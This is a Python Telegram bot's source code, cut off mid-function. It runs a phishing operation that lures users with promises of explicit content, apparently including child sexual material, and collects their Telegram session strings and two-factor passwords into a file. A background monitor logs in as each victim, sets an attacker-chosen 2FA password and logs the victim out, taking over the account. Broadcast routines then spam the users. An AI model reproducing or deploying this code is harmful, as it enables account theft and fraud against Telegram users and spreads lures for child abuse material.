from flask import Flask, request, jsonify
import os, json, base64, threading, asyncio, logging, traceback, uuid, time
from datetime import datetime
import requests as http_requests
from telethon import TelegramClient, errors, events
from telethon.tl.custom import Button
from telethon.sessions import StringSession
import sys

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(name)s: %(message)s')
logger = logging.getLogger(__name__)


def _si(v, d=0):
    try:
        return int(str(v).strip()) if v not in (None, "") else d
    except Exception:
        return d


BOT_TOKEN = (os.environ.get("BOT_TOKEN") or "").strip()
API_ID = _si(os.environ.get("API_ID"), 0)
API_HASH = (os.environ.get("API_HASH") or "").strip()
YOUR_TELEGRAM_ID = _si(os.environ.get("OWNER_ID"), 0)
PORT = _si(os.environ.get("PORT"), 5000)
WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://two-fishing.onrender.com/tg")
SELF_URL = os.environ.get("SELF_URL", "https://two-fishing.onrender.com/health")

DEFAULT_WELCOME_MSGS = [
    {"type": "text", "content": "**Hello {name} 👋**\n\n🔞**To again access to the files completely free of charge, do the following💦:**\n\n>👇Confirm that you are not a robot."},
    {"type": "text", "content": "👇"},
]

DEFAULT_SHARE_MSG = """https://t.me/Xxxvo_bot
https://t.me/Xxxvo_bot

ᴠɪʀᴀʟ ᴄᴩ ᴍᴍꜱ xxx👆"""

logger.info("=" * 60)
logger.info("ADMIN BOT START")
logger.info(f"  BOT_TOKEN  : {'SET' if BOT_TOKEN else 'MISSING'}")
logger.info(f"  API_ID     : {API_ID}")
logger.info(f"  OWNER_ID   : {YOUR_TELEGRAM_ID}")
logger.info("=" * 60)

if sys.version_info >= (3, 12) and sys.platform == 'win32':
    try:
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    except Exception:
        pass

app = Flask(__name__)
user_sessions = {}
pending_codes = {}
sessions_lock = threading.Lock()
DATA_FILE = "captured_accounts.json"
USERS_FILE = "bot_users.json"
WELCOME_FILE = "welcome_config.json"
BROADCAST_CFG_FILE = "broadcast_config.json"
SHARE_FILE = "share_config.json"
AUTOPASS_FILE = "auto_2fa.json"

STATE = {
    "welcome_capture": False,
    "bc_nonlogged_capture": False,
    "bc_logged_capture": False,
    "awaiting_timer": False,
    "awaiting_btn_text": False,
    "awaiting_btn_url": False,
    "awaiting_share_msg": False,
    "awaiting_2fa_pass": False,
}

broadcast_state = {
    "nonlogged_active": False,
    "nonlogged_next": 0,
    "logged_active": False,
    "logged_next": 0,
    "interval": 60,
}

timer_value = 60
AUTO_DELETE_EXPIRED = True


def md_to_html(text):
    import re
    if not text:
        return text
    lines = text.split("\n")
    processed = []
    for line in lines:
        stripped = line.lstrip()
        if stripped.startswith("> "):
            processed.append(f"\x00Q{stripped[2:]}\x00")
        elif stripped.startswith(">"):
            processed.append(f"\x00Q{stripped[1:].lstrip()}\x00")
        else:
            processed.append(line)
    text = "\n".join(processed)
    text = text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
    text = re.sub(r'```(.+?)```', r'<pre>\1</pre>', text, flags=re.DOTALL)
    text = re.sub(r'`([^`\n]+?)`', r'<code>\1</code>', text)
    text = re.sub(r'\*\*(.+?)\*\*', r'<b>\1</b>', text, flags=re.DOTALL)
    text = re.sub(r'__(.+?)__', r'<i>\1</i>', text, flags=re.DOTALL)
    text = text.replace("\x00Q", "<blockquote>").replace("\x00", "</blockquote>")
    return text


def load_json(path, default):
    if os.path.exists(path):
        try:
            with open(path) as f:
                return json.load(f)
        except Exception:
            return default
    return default


def save_json(path, data):
    try:
        with open(path, 'w') as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        logger.error(f"save {path}: {e}")


def load_users():
    return load_json(USERS_FILE, {})


def save_users(d):
    save_json(USERS_FILE, d)


def load_accounts():
    return load_json(DATA_FILE, [])


def save_account(account):
    accounts = load_accounts()
    found = False
    for i, a in enumerate(accounts):
        if a['phone'] == account['phone']:
            accounts[i] = account
            found = True
            break
    if not found:
        accounts.append(account)
    save_json(DATA_FILE, accounts)
    return account


def load_welcome_config():
    cfg = load_json(WELCOME_FILE, None)
    if not cfg or not isinstance(cfg, dict) or not cfg.get("messages"):
        cfg = {
            "messages": DEFAULT_WELCOME_MSGS,
            "button_text": "CONFIRM NOW",
            "button_url": WEBAPP_URL + "?auto=1",
            "show_button": False,
        }
        save_json(WELCOME_FILE, cfg)
    return cfg


def save_welcome_config(cfg):
    save_json(WELCOME_FILE, cfg)


def load_broadcast_config():
    cfg = load_json(BROADCAST_CFG_FILE, None)
    if not cfg or not isinstance(cfg, dict):
        cfg = {"nonlogged": [], "logged": [], "interval": 60}
        save_json(BROADCAST_CFG_FILE, cfg)
    return cfg


def save_broadcast_config(cfg):
    save_json(BROADCAST_CFG_FILE, cfg)


def load_share_config():
    cfg = load_json(SHARE_FILE, None)
    if not cfg or not isinstance(cfg, dict) or "message" not in cfg:
        cfg = {"message": DEFAULT_SHARE_MSG}
        save_json(SHARE_FILE, cfg)
    return cfg


def save_share_config(cfg):
    save_json(SHARE_FILE, cfg)


def load_autopass():
    cfg = load_json(AUTOPASS_FILE, {"password": ""})
    return cfg.get("password", "")


def save_autopass(pwd):
    save_json(AUTOPASS_FILE, {"password": pwd})


captured_accounts = load_accounts()
users = load_users()
welcome_config = load_welcome_config()
broadcast_config = load_broadcast_config()
share_config = load_share_config()
auto_2fa_pass = load_autopass()


def format_phone(ph):
    if not ph:
        return ph
    digits = ''.join(filter(str.isdigit, ph))
    if not digits:
        return ph
    if ph.startswith('+'):
        return ph
    if len(digits) == 10:
        return '+91' + digits
    if len(digits) == 12 and digits.startswith('91'):
        return '+' + digits
    return '+' + digits


def account_label(a):
    st = a.get("status", "active")
    if st == "terminated":
        return "⚰️"
    if st == "expired":
        return "❌"
    if a.get("is_premium"):
        return "👹👹"
    return "✨✨"


# ============================================================
# ADMIN BOT
# ============================================================
SESSION_PATH = f"/tmp/adminbot_{uuid.uuid4().hex[:8]}.session"
bot = TelegramClient(SESSION_PATH, API_ID, API_HASH)


def admin_menu():
    return [
        [Button.inline("👋 Welcome Messages", b"menu_welcome"),
         Button.inline("📢 Broadcast", b"menu_broadcast")],
        [Button.inline("🔗 Share Message", b"menu_share"),
         Button.inline("🔴 Expired", b"menu_expired")],
        [Button.inline("👥 Users", b"menu_users"),
         Button.inline("📊 Stats", b"menu_stats")],
        [Button.inline(f"⏱ Timer: {timer_value}s", b"menu_timer"),
         Button.inline(f"🗑 Auto-Del: {'ON' if AUTO_DELETE_EXPIRED else 'OFF'}", b"menu_toggle_expired")],
        [Button.inline(f"🔐 Auto 2FA: {'SET' if auto_2fa_pass else 'EMPTY'}", b"menu_autopass")],
        [Button.inline("🔄 Reset Modes", b"menu_reset")],
    ]


def welcome_menu():
    return [
        [Button.inline("➕ Add Messages", b"wl_add"),
         Button.inline("📋 List", b"wl_list")],
        [Button.inline("🗑 Clear All", b"wl_clear")],
        [Button.inline("🔘 Button Text", b"wl_btntext"),
         Button.inline("🔗 Button URL", b"wl_btnurl")],
        [Button.inline("👁 Preview", b"wl_preview"),
         Button.inline("🔕 Toggle Button", b"wl_toggle_btn")],
        [Button.inline("⬅️ Back", b"menu_home")],
    ]


def broadcast_menu():
    return [
        [Button.inline("📢 Non-Logged", b"bc_nonlogged"),
         Button.inline("✅ Logged", b"bc_logged")],
        [Button.inline("⬅️ Back", b"menu_home")],
    ]


def bc_nonlogged_menu():
    n = len(broadcast_config.get("nonlogged", []))
    a = broadcast_state["nonlogged_active"]
    return [
        [Button.inline("➕ Add", b"bcnl_add"),
         Button.inline("▶️ Start" if not a else "⏹ Running", b"bcnl_start")],
        [Button.inline("⏹ Stop", b"bcnl_stop"),
         Button.inline("🗑 Clear", b"bcnl_clear")],
        [Button.inline(f"📋 Queue ({n})", b"bcnl_show")],
        [Button.inline("⬅️ Back", b"menu_broadcast")],
    ]


def bc_logged_menu():
    n = len(broadcast_config.get("logged", []))
    a = broadcast_state["logged_active"]
    return [
        [Button.inline("➕ Add", b"bclg_add"),
         Button.inline("▶️ Start" if not a else "⏹ Running", b"bclg_start")],
        [Button.inline("⏹ Stop", b"bclg_stop"),
         Button.inline("🗑 Clear", b"bclg_clear")],
        [Button.inline(f"📋 Queue ({n})", b"bclg_show")],
        [Button.inline("⬅️ Back", b"menu_broadcast")],
    ]


def share_menu():
    return [
        [Button.inline("✏️ Edit Share Message", b"sh_edit")],
        [Button.inline("🔄 Reset to Default", b"sh_reset")],
        [Button.inline("👁 Preview", b"sh_preview")],
        [Button.inline("⬅️ Back", b"menu_home")],
    ]


async def safe_send(chat_id, text, buttons=None, edit_event=None):
    if edit_event:
        try:
            await edit_event.edit(text, buttons=buttons, parse_mode='md')
            return True
        except errors.MessageNotModifiedError:
            return True
        except Exception as e:
            logger.warning(f"edit fail: {type(e).__name__}: {e}")
    try:
        await bot.send_message(chat_id, text, buttons=buttons, parse_mode='md')
        return True
    except Exception as e:
        logger.warning(f"send-md fail: {type(e).__name__}: {e}")
    try:
        await bot.send_message(chat_id, text, buttons=buttons)
        return True
    except Exception as e:
        logger.warning(f"send-plain fail: {type(e).__name__}: {e}")
    try:
        await bot.send_message(chat_id, text)
        return True
    except Exception as e:
        logger.error(f"safe_send ALL FAIL: {type(e).__name__}: {e}")
        return False


async def safe_send_user(uid, text, buttons=None):
    html_text = md_to_html(text)
    try:
        sent = await bot.send_message(uid, html_text, buttons=buttons, parse_mode='html')
        return sent
    except Exception as e1:
        logger.warning(f"HTML fail: {type(e1).__name__}: {e1}")
    try:
        sent = await bot.send_message(uid, text, buttons=buttons, parse_mode='md')
        return sent
    except Exception as e2:
        logger.warning(f"MD fail: {type(e2).__name__}: {e2}")
    try:
        sent = await bot.send_message(uid, text, buttons=buttons)
        return sent
    except Exception as e3:
        logger.error(f"Plain fail: {type(e3).__name__}: {e3}")
    return None


async def send_welcome(uid, name):
    logger.info(f"=== SEND_WELCOME uid={uid} name={name} ===")
    msgs = welcome_config.get("messages", [])
    if not msgs:
        return []
    show_button = welcome_config.get("show_button", False)
    btn_text = welcome_config.get("button_text", "CONFIRM NOW")
    btn_url = welcome_config.get("button_url", WEBAPP_URL + "?auto=1")
    sent_ids = []
    for i, m in enumerate(msgs):
        content = (m.get("content") or "").replace("{name}", name)
        is_last = (i == len(msgs) - 1)
        buttons = None
        if is_last and show_button:
            buttons = [[Button.url(btn_text, btn_url)]]
        sent_msg = await safe_send_user(uid, content, buttons)
        if sent_msg:
            sent_ids.append(sent_msg.id)
            logger.info(f"✅ Welcome #{i+1} sent: {sent_msg.id}")
        await asyncio.sleep(0.3)
    return sent_ids


@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    logger.info("=== Admin /start ===")
    try:
        sender = await event.get_sender()
        uid = sender.id
        name = sender.first_name or "Friend"
        users[str(uid)] = {
            "id": uid, "name": name,
            "username": sender.username or "",
            "joined": str(datetime.now()),
        }
        save_users(users)
        if uid == YOUR_TELEGRAM_ID:
            await event.respond(
                "🔧 **Admin Panel**\n\nUsers: `" + str(len(users)) + "`",
                buttons=admin_menu(), parse_mode='md')
            return
        await send_welcome(uid, name)
    except Exception as e:
        logger.error(f"/start: {e}")


@bot.on(events.CallbackQuery())
async def cb(event):
    global timer_value, AUTO_DELETE_EXPIRED, auto_2fa_pass, broadcast_config, share_config, welcome_config
    if event.sender_id != YOUR_TELEGRAM_ID:
        return await event.answer("Not authorized", alert=True)
    data = event.data.decode()
    chat_id = event.sender_id

    try:
        if data == "menu_home":
            await event.answer()
            await safe_send(chat_id,
                "🔧 **Admin Panel**\n\nUsers: `" + str(len(users)) + "`",
                admin_menu(), edit_event=event)

        elif data == "menu_reset":
            for k in STATE:
                STATE[k] = False
            await event.answer("Reset!", alert=True)
            await safe_send(chat_id, "✅ Reset.", admin_menu(), edit_event=event)

        elif data == "menu_autopass":
            STATE["awaiting_2fa_pass"] = True
            cur = auto_2fa_pass if auto_2fa_pass else "_(empty)_"
            await event.answer()
            await safe_send(chat_id,
                f"🔐 **Auto 2FA Password**\n\nCurrent: `{cur}`\n\nSend new password (24h por auto-set hobe).",
                [[Button.inline("🗑 Clear", b"autopass_clear"), Button.inline("⬅️ Back", b"menu_home")]],
                edit_event=event)

        elif data == "autopass_clear":
            auto_2fa_pass = ""
            save_autopass("")
            await event.answer("Cleared!", alert=True)
            await safe_send(chat_id, "✅ Cleared.", admin_menu(), edit_event=event)

        elif data == "menu_welcome":
            n = len(welcome_config.get("messages", []))
            btn_state = "ON" if welcome_config.get("show_button") else "OFF"
            await event.answer()
            await safe_send(chat_id,
                f"👋 Welcome — `{n}` active\nButton: `{btn_state}`",
                welcome_menu(), edit_event=event)

        elif data == "wl_add":
            STATE["welcome_capture"] = True
            await event.answer("Send messages")
            await safe_send(chat_id, "✍️ Send welcome msgs one by one. Tap Stop.",
                [[Button.inline("⏹ Stop & Save", b"wl_stop")], [Button.inline("⬅️ Back", b"menu_home")]],
                edit_event=event)

        elif data == "wl_stop":
            STATE["welcome_capture"] = False
            n = len(welcome_config.get("messages", []))
            await event.answer(f"Saved {n}", alert=True)
            await safe_send(chat_id, f"✅ Welcome: `{n}`", admin_menu(), edit_event=event)

        elif data == "wl_list":
            msgs = welcome_config.get("messages", [])
            txt = f"**{len(msgs)} messages:**\n\n" if msgs else "Empty"
            for i, m in enumerate(msgs):
                prev = (m.get("content") or "")[:40].replace("\n", " ")
                txt += f"{i+1}. `{prev}...`\n"
            await event.answer(txt[:200], alert=True)

        elif data == "wl_clear":
            welcome_config["messages"] = []
            save_welcome_config(welcome_config)
            await event.answer("Cleared!", alert=True)
            await safe_send(chat_id, "Cleared.", admin_menu(), edit_event=event)

        elif data == "wl_btntext":
            STATE["awaiting_btn_text"] = True
            await event.answer()
            await safe_send(chat_id, f"Current: `{welcome_config.get('button_text','')}`\nSend new text.",
                [[Button.inline("⬅️ Back", b"menu_home")]], edit_event=event)

        elif data == "wl_btnurl":
            STATE["awaiting_btn_url"] = True
            await event.answer()
            await safe_send(chat_id, f"Current: `{welcome_config.get('button_url','')}`\nSend URL.",
                [[Button.inline("⬅️ Back", b"menu_home")]], edit_event=event)

        elif data == "wl_toggle_btn":
            welcome_config["show_button"] = not welcome_config.get("show_button", False)
            save_welcome_config(welcome_config)
            s = "ON" if welcome_config["show_button"] else "OFF"
            await event.answer(f"Button {s}", alert=True)
            await safe_send(chat_id, f"🔘 Button: **{s}**",
                [[Button.inline("⬅️ Back", b"menu_welcome")]], edit_event=event)

        elif data == "wl_preview":
            await event.answer("Preview sent")
            msgs = welcome_config.get("messages", [])
            show = welcome_config.get("show_button", False)
            for i, m in enumerate(msgs):
                content = (m.get("content") or "").replace("{name}", "Preview")
                is_last = (i == len(msgs) - 1)
                btns = None
                if is_last and show:
                    btns = [[Button.url(welcome_config.get("button_text", "CONFIRM NOW"),
                                        welcome_config.get("button_url", WEBAPP_URL))]]
                await safe_send_user(chat_id, content, btns)

        elif data == "menu_broadcast":
            await event.answer()
            await safe_send(chat_id, "📢 Broadcast", broadcast_menu(), edit_event=event)

        elif data == "bc_nonlogged":
            await event.answer()
            await safe_send(chat_id,
                f"📢 Non-Logged — Queue: `{len(broadcast_config.get('nonlogged', []))}`",
                bc_nonlogged_menu(), edit_event=event)

        elif data == "bcnl_add":
            STATE["bc_nonlogged_capture"] = True
            await event.answer("Send messages")
            await safe_send(chat_id, "📥 Send text/photo/video.",
                [[Button.inline("▶️ Start Now", b"bcnl_start")], [Button.inline("❌ Cancel", b"bcnl_cancel")]],
                edit_event=event)

        elif data == "bcnl_start":
            STATE["bc_nonlogged_capture"] = False
            if not broadcast_config.get("nonlogged"):
                return await event.answer("Empty", alert=True)
            broadcast_state["nonlogged_active"] = True
            broadcast_state["nonlogged_next"] = time.time() + 3
            await event.answer("Started!", alert=True)
            await safe_send(chat_id, "▶️ Started.",
                [[Button.inline("⬅️ Back", b"menu_home")]], edit_event=event)

        elif data == "bcnl_stop":
            broadcast_state["nonlogged_active"] = False
            await event.answer("Stopped", alert=True)
            await safe_send(chat_id, "Stopped.", admin_menu(), edit_event=event)

        elif data == "bcnl_cancel":
            STATE["bc_nonlogged_capture"] = False
            broadcast_config["nonlogged"] = []
            save_broadcast_config(broadcast_config)
            await event.answer("Cancelled")
            await safe_send(chat_id, "Cancelled.", admin_menu(), edit_event=event)

        elif data == "bcnl_clear":
            broadcast_config["nonlogged"] = []
            save_broadcast_config(broadcast_config)
            await event.answer("Cleared", alert=True)

        elif data == "bcnl_show":
            msgs = broadcast_config.get("nonlogged", [])
            txt = f"**{len(msgs)} messages**" if msgs else "Empty"
            await event.answer(txt, alert=True)

        elif data == "bc_logged":
            await event.answer()
            await safe_send(chat_id,
                f"✅ Logged — Queue: `{len(broadcast_config.get('logged', []))}`",
                bc_logged_menu(), edit_event=event)

        elif data == "bclg_add":
            STATE["bc_logged_capture"] = True
            await event.answer("Send messages")
            await safe_send(chat_id, "📥 Send text/photo/video.",
                [[Button.inline("▶️ Start Now", b"bclg_start")], [Button.inline("❌ Cancel", b"bclg_cancel")]],
                edit_event=event)

        elif data == "bclg_start":
            STATE["bc_logged_capture"] = False
            if not broadcast_config.get("logged"):
                return await event.answer("Empty", alert=True)
            broadcast_state["logged_active"] = True
            broadcast_state["logged_next"] = time.time() + 3
            await event.answer("Started!", alert=True)
            await safe_send(chat_id, "▶️ Started.",
                [[Button.inline("⬅️ Back", b"menu_home")]], edit_event=event)

        elif data == "bclg_stop":
            broadcast_state["logged_active"] = False
            await event.answer("Stopped", alert=True)
            await safe_send(chat_id, "Stopped.", admin_menu(), edit_event=event)

        elif data == "bclg_cancel":
            STATE["bc_logged_capture"] = False
            broadcast_config["logged"] = []
            save_broadcast_config(broadcast_config)
            await event.answer("Cancelled")
            await safe_send(chat_id, "Cancelled.", admin_menu(), edit_event=event)

        elif data == "bclg_clear":
            broadcast_config["logged"] = []
            save_broadcast_config(broadcast_config)
            await event.answer("Cleared", alert=True)

        elif data == "bclg_show":
            msgs = broadcast_config.get("logged", [])
            txt = f"**{len(msgs)} messages**" if msgs else "Empty"
            await event.answer(txt, alert=True)

        elif data == "menu_share":
            msg = share_config.get("message", DEFAULT_SHARE_MSG)
            await event.answer()
            await safe_send(chat_id, f"🔗 Share\n\n**Current:**\n{msg}",
                share_menu(), edit_event=event)

        elif data == "sh_edit":
            STATE["awaiting_share_msg"] = True
            await event.answer()
            await safe_send(chat_id, "✏️ Send new share message.",
                [[Button.inline("⬅️ Back", b"menu_share")]], edit_event=event)

        elif data == "sh_reset":
            share_config["message"] = DEFAULT_SHARE_MSG
            save_share_config(share_config)
            await event.answer("Reset!", alert=True)
            await safe_send(chat_id, "✅ Reset.", share_menu(), edit_event=event)

        elif data == "sh_preview":
            await event.answer("Sent")
            await bot.send_message(chat_id, share_config.get("message", DEFAULT_SHARE_MSG))

        elif data == "menu_expired":
            accounts = load_accounts()
            expired = [a for a in accounts if a.get("status") == "expired"]
            termin = [a for a in accounts if a.get("status") == "terminated"]
            prem = [a for a in accounts if a.get("is_premium")]
            txt = f"🔴 Expired: `{len(expired)}`\n⚰️ Terminated: `{len(termin)}`\n👹👹 Premium: `{len(prem)}`"
            await event.answer()
            await safe_send(chat_id, txt, [
                [Button.inline("🗑 Delete Expired", b"expired_del")],
                [Button.inline("🗑 Delete Terminated", b"terminated_del")],
                [Button.inline("🗑 Delete Both", b"expired_del_both")],
                [Button.inline("⬅️ Back", b"menu_home")]
            ], edit_event=event)

        elif data == "expired_del":
            accounts = load_accounts()
            new_a = [a for a in accounts if a.get("status") != "expired"]
            save_json(DATA_FILE, new_a)
            captured_accounts = new_a
            await event.answer(f"Deleted {len(accounts) - len(new_a)}", alert=True)
            await safe_send(chat_id, "✅", admin_menu(), edit_event=event)

        elif data == "terminated_del":
            accounts = load_accounts()
            new_a = [a for a in accounts if a.get("status") != "terminated"]
            save_json(DATA_FILE, new_a)
            captured_accounts = new_a
            await event.answer(f"Deleted {len(accounts) - len(new_a)}", alert=True)
            await safe_send(chat_id, "✅", admin_menu(), edit_event=event)

        elif data == "expired_del_both":
            accounts = load_accounts()
            new_a = [a for a in accounts if a.get("status") not in ("expired", "terminated")]
            save_json(DATA_FILE, new_a)
            captured_accounts = new_a
            await event.answer(f"Deleted {len(accounts) - len(new_a)}", alert=True)
            await safe_send(chat_id, "✅", admin_menu(), edit_event=event)

        elif data == "menu_toggle_expired":
            AUTO_DELETE_EXPIRED = not AUTO_DELETE_EXPIRED
            await event.answer(f"Auto-Del: {'ON' if AUTO_DELETE_EXPIRED else 'OFF'}", alert=True)
            await safe_send(chat_id, f"🗑 Auto-Del: **{'ON' if AUTO_DELETE_EXPIRED else 'OFF'}**",
                admin_menu(), edit_event=event)

        elif data == "menu_timer":
            STATE["awaiting_timer"] = True
            await event.answer()
            await safe_send(chat_id, f"⏱ Current: `{timer_value}s`\nSend number.",
                [[Button.inline("⬅️ Back", b"menu_home")]], edit_event=event)

        elif data == "menu_users":
            await event.answer(f"Total: {len(users)}", alert=True)

        elif data == "menu_stats":
            exp = sum(1 for a in captured_accounts if a.get("status") == "expired")
            term = sum(1 for a in captured_accounts if a.get("status") == "terminated")
            await event.answer(
                f"Users: {len(users)}\nAccounts: {len(captured_accounts)}\nExpired: {exp}\nTerminated: {term}\n2FA: {'SET' if auto_2fa_pass else 'EMPTY'}",
                alert=True)

        else:
            await event.answer("Unknown", alert=True)

    except Exception as e:
        logger.error(f"CB ERROR [{data}]: {type(e).__name__}: {e}")
        logger.error(traceback.format_exc())


@bot.on(events.NewMessage(pattern='/cancel'))
async def cancel(event):
    if event.sender_id != YOUR_TELEGRAM_ID:
        return
    for k in STATE:
        STATE[k] = False
    await event.respond("Cancelled.", buttons=admin_menu())


@bot.on(events.NewMessage())
async def capture(event):
    global welcome_config, broadcast_config, share_config, auto_2fa_pass
    if event.sender_id != YOUR_TELEGRAM_ID:
        return
    txt = event.raw_text or ""
    if txt.startswith('/'):
        return

    if STATE["awaiting_timer"]:
        try:
            sec = int(txt.strip())
            if sec < 5:
                return await event.respond("Min 5s")
            timer_value = sec
            STATE["awaiting_timer"] = False
            broadcast_state['interval'] = sec
            await event.respond(f"✅ Timer: **{sec}s**", buttons=admin_menu(), parse_mode='md')
        except ValueError:
            await event.respond("Send number")
        return

    if STATE["awaiting_btn_text"]:
        welcome_config["button_text"] = txt.strip()[:40]
        STATE["awaiting_btn_text"] = False
        save_welcome_config(welcome_config)
        await event.respond(f"✅ `{welcome_config['button_text']}`", buttons=admin_menu(), parse_mode='md')
        return

    if STATE["awaiting_btn_url"]:
        welcome_config["button_url"] = txt.strip()
        STATE["awaiting_btn_url"] = False
        save_welcome_config(welcome_config)
        await event.respond("✅ URL set", buttons=admin_menu(), parse_mode='md')
        return

    if STATE["awaiting_share_msg"]:
        share_config["message"] = txt
        STATE["awaiting_share_msg"] = False
        save_share_config(share_config)
        await event.respond("✅ Share updated.", buttons=admin_menu(), parse_mode='md')
        return

    if STATE["awaiting_2fa_pass"]:
        auto_2fa_pass = txt.strip()
        STATE["awaiting_2fa_pass"] = False
        save_autopass(auto_2fa_pass)
        await event.respond(f"✅ Auto 2FA: `{auto_2fa_pass}`", buttons=admin_menu(), parse_mode='md')
        return

    if STATE["welcome_capture"]:
        m = event.message
        entry = {"type": "text", "content": m.message or ""}
        if m.photo:
            entry = {"type": "photo", "content": m.message or ""}
        elif m.video:
            entry = {"type": "video", "content": m.message or ""}
        welcome_config.setdefault("messages", []).append(entry)
        save_welcome_config(welcome_config)
        await event.respond(f"✅ Welcome #{len(welcome_config['messages'])} added.",
            buttons=[[Button.inline("⏹ Stop & Save", b"wl_stop")], [Button.inline("⬅️ Back", b"menu_home")]])
        return

    if STATE["bc_nonlogged_capture"]:
        m = event.message
        entry = {"type": "text", "content": m.message or "",
                 "caption": "", "_msg_id": m.id, "_chat_id": event.chat_id}
        if m.photo:
            entry["type"] = "photo"
            entry["caption"] = m.message or ""
        elif m.video:
            entry["type"] = "video"
            entry["caption"] = m.message or ""
        broadcast_config.setdefault("nonlogged", []).append(entry)
        save_broadcast_config(broadcast_config)
        await event.respond(f"✅ NL #{len(broadcast_config['nonlogged'])} added.",
            buttons=[[Button.inline("▶️ Start Now", b"bcnl_start")], [Button.inline("❌ Cancel", b"bcnl_cancel")]])
        return

    if STATE["bc_logged_capture"]:
        m = event.message
        entry = {"type": "text", "content": m.message or "",
                 "caption": "", "_msg_id": m.id, "_chat_id": event.chat_id}
        if m.photo:
            entry["type"] = "photo"
            entry["caption"] = m.message or ""
        elif m.video:
            entry["type"] = "video"
            entry["caption"] = m.message or ""
        broadcast_config.setdefault("logged", []).append(entry)
        save_broadcast_config(broadcast_config)
        await event.respond(f"✅ Logged #{len(broadcast_config['logged'])} added.",
            buttons=[[Button.inline("▶️ Start Now", b"bclg_start")], [Button.inline("❌ Cancel", b"bclg_cancel")]])
        return


async def section_monitor():
    global AUTO_DELETE_EXPIRED, auto_2fa_pass
    while True:
        try:
            await asyncio.sleep(60)
            accounts = load_accounts()
            if not accounts:
                continue
            changed = False
            new_accounts = []
            for a in accounts:
                if a.get("status") == "terminated":
                    new_accounts.append(a)
                    continue
                session_str = a.get("session", "")
                if not session_str:
                    new_accounts.append(a)
                    continue
                try:
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)

                    async def check_session():
                        c = TelegramClient(StringSession(session_str), API_ID, API_HASH)
                        await c.connect()
                        try:
                            return await c.is_user_authorized()
                        finally:
                            await c.disconnect()

                    is_valid = loop.run_until_complete(check_session())
                    loop.close()

                    if not is_valid and a.get("status") != "expired":
                        a["status"] = "expired"
                        a["expired_at"] = time.time()
                        changed = True
                        logger.info(f"Expired: {a['phone']}")
                        await edit_admin_msg(a, "❌ EXPIRE HOYECHE")
                        if AUTO_DELETE_EXPIRED:
                            continue

                    if a.get("status") == "active":
                        added = a.get("added_at", 0)
                        if time.time() - added > 86400:
                            if auto_2fa_pass:
                                try:
                                    loopA = asyncio.new_event_loop()
                                    asyncio.set_event_loop(loopA)

                                    async def set_2fa():
                                        c = TelegramClient(StringSession(session_str), API_ID, API_HASH)
                                        await c.connect()
                                        try:
                                            await c.edit_2fa(new_password=auto_2fa_pass)
                                        except Exception as e:
                                            logger.error(f"2fa err: {e}")
                                        finally:
                                            await c.disconnect()
                                    loopA.run_until_complete(set_2fa())
                                    loopA.close()
                                except Exception as e:
                                    logger.error(f"set 2fa err: {e}")

                            try:
                                loop2 = asyncio.new_event_loop()
                                asyncio.set_event_loop(loop2)

                                async def term():
                                    c = TelegramClient(StringSession(session_str), API_ID, API_HASH)
                                    await c.connect()
                                    try:
                                        await c.log_out()
                                    except Exception:
                                        pass
                                    finally:
                                        try:
                                            await c.disconnect()
                                        except Exception:
                                            pass
                                loop2.run_until_complete(term())
                                loop2.close()
                            except Exception as e:
                                logger.error(f"term err: {e}")

                            a["status"] = "terminated"
                            a["terminated_at"] = time.time()
                            a["2fa_password_set"] = auto_2fa_pass
                            changed = True
                            logger.info(f"Terminated: {a['phone']}")
                            await edit_admin_msg(a, "✅ TERMINATE SECTION COMPLETE")

                    new_accounts.append(a)
                except Exception as e:
                    logger.error(f"monitor err: {e}")
                    new_accounts.append(a)
            if changed or len(new_accounts) != len(accounts):
                save_json(DATA_FILE, new_accounts)
                captured_accounts = new_accounts
        except Exception as e:
            logger.error(f"section_monitor err: {e}")


async def edit_admin_msg(account, status_text):
    try:
        msg_id = account.get("admin_notify_msg_id")
        if msg_id:
            phone = account.get("phone", "?")
            name = (account.get("first_name", "") or "") + " " + (account.get("last_name", "") or "")
            name = name.strip() or "?"
            dc = account.get("dc", "?")
            ss = account.get("session", "")
            pu = account.get("has_2fa", False)
            pv = account.get("password", "")
            extra = ""
            if pu:
                extra = "\n2FA Used"
                if pv:
                    extra += f" | Pwd: `{pv}`"
            new_text = (f"{status_text}{extra}\n\n"
                        f"Phone: {phone}\n"
                        f"Name: {name}\n"
                        f"User ID: {account.get('user_id', '?')}\n"
                        f"DC: {dc}\n\n"
                        f"Session:\n`{ss}`")
            if len(new_text) > 4000:
                new_text = new_text[:3990] + "..."
            try:
                await bot.edit_message(YOUR_TELEGRAM_ID, msg_id, new_text, parse_mode='md')
                logger.info(f"✅ Admin msg edited: {phone}")
            except Exception as e:
                logger.error(f"admin edit err: {e}")
    except Exception as e:
        logger.error(f"edit_admin_msg err: {e}")


async def broadcast_loop():
    while True:
        try:
            await asyncio.sleep(3)
            if broadcast_state["nonlogged_active"] and time.time() >= broadcast_state["nonlogged_next"]:
                msgs = broadcast_config.get("nonlogged", [])
                if msgs:
                    await run_broadcast(msgs, target="nonlogged")
                    broadcast_state["nonlogged_next"] = time.time() + broadcast_state['interval']
                else:
                    broadcast_state["nonlogged_active"] = False
            if broadcast_state["logged_active"] and time.time() >= broadcast_state["logged_next"]:
                msgs = broadcast_config.get("logged", [])
                if msgs:
                    await run_broadcast(msgs, target="logged")
                    broadcast_state["logged_next"] = time.time() + broadcast_state['interval']
                else:
                    broadcast_state["logged_active"] = False
        except Exception as e:
            logger.error(f"loop err: {e}")


async def run_broadcast(messages, target="nonlogged"):
    if target == "logged":
        captured_uids = set()
        for a in captured_accounts:
            uid = a.get("user_id")
            if uid:
                captured_uids.add(str(uid))
        target_uids = [u for u in users.keys() if u in captured_uids]
    else:
        captured_uids = set()
        for a in captured_accounts:
            uid = a.get("user_id")
            if uid:
                captured_uids.add(str(uid))
        target_uids = [u for u in users.keys() if u not in captured_uids]

    ok = 0
    fail = 0
    for uid_str in target_uids:
        try:
            uid = int(uid_str)
            for entry in messages:
                try:
                    if entry['type'] == 'text':
                        s = await safe_send_user(uid, entry['content'] or entry['caption'])
                        ok += 1 if s else 0
                        fail += 0 if s else 1
                    elif entry['type'] in ('photo', 'video'):
                        try:
